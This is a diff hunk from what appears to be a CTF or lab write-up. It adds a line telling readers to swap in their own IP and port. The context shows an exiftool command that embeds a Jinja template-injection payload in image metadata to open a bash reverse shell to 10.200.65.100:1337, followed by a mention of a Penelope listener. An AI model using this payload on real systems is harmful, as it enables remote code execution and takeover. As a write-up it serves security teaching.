@@ -177,6 +177,8 @@ With RCE as root we swap the command for a reverse shell payload and embed it in
 exiftool -Artist="{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \"bash -i >& /dev/tcp/10.200.65.100/1337 0>&1\"').read() }}" image.png
 ```
 
+Update the IP and port to your own.
+
 We start our Penelope listener, which upgrades the TTY on its own once a shell lands.
 
 ```
